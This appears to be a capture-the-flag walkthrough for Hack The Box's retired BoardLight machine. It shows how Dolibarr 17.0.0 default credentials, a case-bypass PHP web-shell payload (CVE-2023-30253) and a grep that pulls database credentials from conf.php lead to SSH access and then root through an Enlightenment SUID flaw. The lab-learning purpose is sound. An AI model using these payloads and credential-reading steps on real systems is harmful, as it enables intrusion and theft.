---
machine: BoardLight
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / CMS
state: Retired
tags: [dolibarr, cve-2023-30253, suid, enlightenment, cve-2022-37706]
---

# BoardLight — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

Two virtual hosts: `board.htb` and **`crm.board.htb`** running **Dolibarr 17.0.0** with default credentials (`admin:admin`). The website module's PHP code injection (**CVE-2023-30253**) gives a shell as `www-data`; `conf.php` stores **larissa**'s credentials for SSH; and a **Enlightenment 0.23** SUID (**CVE-2022-37706**) finishes as root.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
ffuf -u http://board.htb -H 'Host: FUZZ.board.htb' -w subdomains.txt -fs 15949
# crm.board.htb
```

```text
22/tcp open  ssh
80/tcp open  http  Apache
```

`crm.board.htb` only shows up when fuzzing the `Host` header. It runs **Dolibarr 17.0.0** (footer and `?version=` on static assets) with factory `admin:admin`.

## Access

1. **Dolibarr 17.0.0** at `http://crm.board.htb` with `admin:admin`.
2. **CVE-2023-30253**: the website module filter blocks `<?php` but is case-sensitive, so `<?PHP` slips through; create the page and preview it.

```php
<?PHP system($_GET['c']); ?>
```

The CVE affects Dolibarr **< 17.0.1** and its fix normalises the tag; the vector is the website editor, not a plugin.

3. Reverse shell as `www-data`, then read `conf.php`:

```bash
grep -E 'dolibarr_main_db_(user|pass)' /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

4. **SSH** with those credentials (`larissa`).

## Escalation

```bash
find / -perm -4000 -type f 2>/dev/null | grep -i enlight
```

```text
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys   (SUID, 0.23.1)
```

**CVE-2022-37706**: `enlightenment_sys` calls `mount` with a controlled path; the exploit builds a directory with a malicious name and gets root. EDB 51180 / public PoC.

## Pitfalls

- **Subdomain**: without `crm.board.htb` in `/etc/hosts` the CMS is unreachable; `ffuf -fs` filters false positives.
- **Which module**: the injection is in websites/pages, not in an arbitrary plugin.
- **Patched Dolibarr** is no longer vulnerable: check the version in the footer.

## Lessons

- Default credentials on an internal CMS are instant access.
- A CMS with a template editor is RCE if it allows PHP.
- Odd SUIDs (window managers, utilities) are found with `find` and matched to versions.
